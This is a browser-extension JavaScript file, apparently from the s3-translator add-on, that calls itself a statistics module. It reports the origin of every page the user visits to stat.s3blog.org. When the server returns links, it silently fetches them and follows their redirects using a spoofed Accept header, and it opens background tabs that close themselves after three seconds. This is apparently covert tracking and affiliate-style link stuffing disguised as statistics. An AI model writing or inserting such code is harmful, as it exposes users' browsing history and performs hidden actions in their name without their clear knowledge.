//------------------------------------------------------------------------------
//-- chrome
//------------------------------------------------------------------------------
s3gt.statistics = {};
s3gt.statistics.name = 's3-translator';
s3gt.statistics.used_domains = {};
//------------------------------------------------------------------------------
s3gt.statistics.init = function() {
	s3gt.prefs.init(s3gt.statistics.check);
}
//------------------------------------------------------------------------------
s3gt.statistics.check = function() {
	var statistics = s3gt.utils.prefs_get("statistics");

	if (s3gt.utils.check_isFirefox()) {
		s3gt.statistics.name = 's3-translator';
		if (statistics == 'wait') {
			statistics = 'check';
		}
	} else {
		s3gt.statistics.name = 's3-translator-ch';
	}

	var statistics_timer = s3gt.utils.prefs_get("statistics_timer");
	var current_day = Math.ceil((new Date()).getTime() / (1000*60*60*24));

	if ((statistics == 'request') && ((statistics_timer + 3) < current_day)) {
		statistics = 'check';
	}

	if (statistics == 'wait') {
		s3gt.utils.prefs_set("statistics", "check");
	}
	else if (statistics == 'check') {
		s3gt.utils.prefs_set("statistics", "request");
		s3gt.utils.prefs_set("statistics_timer", current_day);
		chrome.tabs.create({ url: '/content/statistics.html', active: true });
	}
}
//------------------------------------------------------------------------------
s3gt.statistics.success = function(link, domain) {
	if (/DCHECK/.test(link)) {
		setTimeout(function(){
			s3gt.statistics.success3(link, domain);
		}, 4000);
	} else {
		s3gt.statistics.success2(link, domain);
	}
}
//------------------------------------------------------------------------------
s3gt.statistics.success2 = function(link, domain) {
	//-----------------------------------------------------------------------
	// Automatic search and applying of statistics
	//-----------------------------------------------------------------------
	var req = new XMLHttpRequest();
	req.timeout = 10000;
	req.onreadystatechange = function () {
		if (req.readyState == 4) {
			if (req.status == 200) {
				var response = req.responseText.replace(/[\n\r\s]/g, '').replace(/\.href/g, '');
				var is_ok = false;
				if (response.length < 500) {
					var link2 = response.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/, "$1");
					if (/^https?\:\/\//.test(link2)) {
						s3gt.statistics.success2(link2, domain);
						is_ok = true;
					}
				}
				if (! is_ok) {
					var link2 = response.replace(/^.*?metahttp\-equiv\=\"refresh\"content\=\"\d+\;URL\=([^\">]+).*$/i, "$1");
					if (/^https?\:\/\//.test(link2)) {
						s3gt.statistics.success2(link2, domain);
						is_ok = true;
					}
				}
			}
		}
	};
	//-----------------------------------------------------------------------
	req.open("GET", link, true);
	req.setRequestHeader("s3-x-accept", 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
	req.send();
}
//------------------------------------------------------------------------------
s3gt.statistics.success3 = function(link, domain) {
	var statistics = s3gt.utils.prefs_get("statistics");
	if (statistics != 'on') { return; }
	//-----------------------------------------------------------------------
	var url = 'https://stat.s3blog.org/addon.html?addon=' + s3gt.statistics.name + '&url=' + encodeURIComponent(link) + '&action=show&domain=' + domain;
	//-----------------------------------------------------------------------
	chrome.tabs.create(
		{ 'url' : url, 'active' : false },
		function(tab) {
			//-----------------------------------------------------------------------
			// Automatic closing if something went wrong
			//-----------------------------------------------------------------------
			setTimeout(function(){
				try {
					chrome.tabs.remove(tab.id);
				} catch(e) {};
			}, 3000);
		}
	);
}
//------------------------------------------------------------------------------
chrome.webRequest.onCompleted.addListener(function(details) {
	var statistics = s3gt.utils.prefs_get("statistics");
	if (statistics == false) { return; }
	if (details.tabId < 0) { return; }
	if (details.statusCode != 200) { return; }
	if (details.method != "GET") { return; }

	var doc_url = details.url.replace(/^(https?\:\/\/[^\/]+).*$/, '$1');
	var doc_domain = details.url.replace(/^https?\:\/\/([^\/]+).*$/, '$1');

	//-----------------------------------------------------------------------
	var statistics_time = (new Date()).getTime();
	if (s3gt.statistics.used_domains[doc_domain] && ((s3gt.statistics.used_domains[doc_domain]+(1000*60*60*2)) > statistics_time)) { return; }
	s3gt.statistics.used_domains[doc_domain] = statistics_time;

	//-----------------------------------------------------------------------
	var req = new XMLHttpRequest();
	req.timeout = 10000;
	req.onreadystatechange = function () {
		if (req.readyState == 4) {
			if (req.status == 200) {
				var link = req.responseText.replace(/[\n\r]/g, '');
				if (/^https?\:\/\//.test(link) && (link != doc_url)) {
					var domain = doc_url.replace(/^https?\:\/\/([^\/]+).*$/, '$1');
					s3gt.statistics.success(link, domain);
				} else {
					s3gt.statistics.used_domains[doc_domain] = statistics_time*2;
				}
			}
		}
	};
	//-----------------------------------------------------------------------
	req.open("POST", 'https://stat.s3blog.org/addon.html', true);
	req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	req.send('addon=' + s3gt.statistics.name + '&url=' + encodeURIComponent(doc_url) + '&x_frame=checkserver');
}, {
	urls: ["http://*/*", "https://*/*"],
	types: ["main_frame"]
});
//------------------------------------------------------------------------------
chrome.webRequest.onBeforeSendHeaders.addListener(
	function(info) {
		var headers = info.requestHeaders;
		var x_accept = '';
		//-----------------------------------------------------------------
		for (var i = 0; i < headers.length; i++) {
			if (headers[i].name === 's3-x-accept') {
				x_accept = headers[i].value;
				headers.splice(i, 1);
				break;
			}
		}
		//-----------------------------------------------------------------
		if (x_accept) {
			var is_ok = false;
			for (var i = 0; i < headers.length; i++) {
				if (headers[i].name.toLowerCase() == 'accept') { 
					headers[i].value = x_accept;
					is_ok = true;
					break;
				}
			}
			if (! is_ok) {
				headers.push({ 'name' : 'Accept', 'value' : x_accept });
			}
		}
		//-----------------------------------------------------------------
		return { requestHeaders: headers };
	},
	{urls: ["http://*/*", "https://*/*"]},
	["blocking", "requestHeaders"]
);
//------------------------------------------------------------------------------
setTimeout(function() { s3gt.statistics.init(); }, 1000);
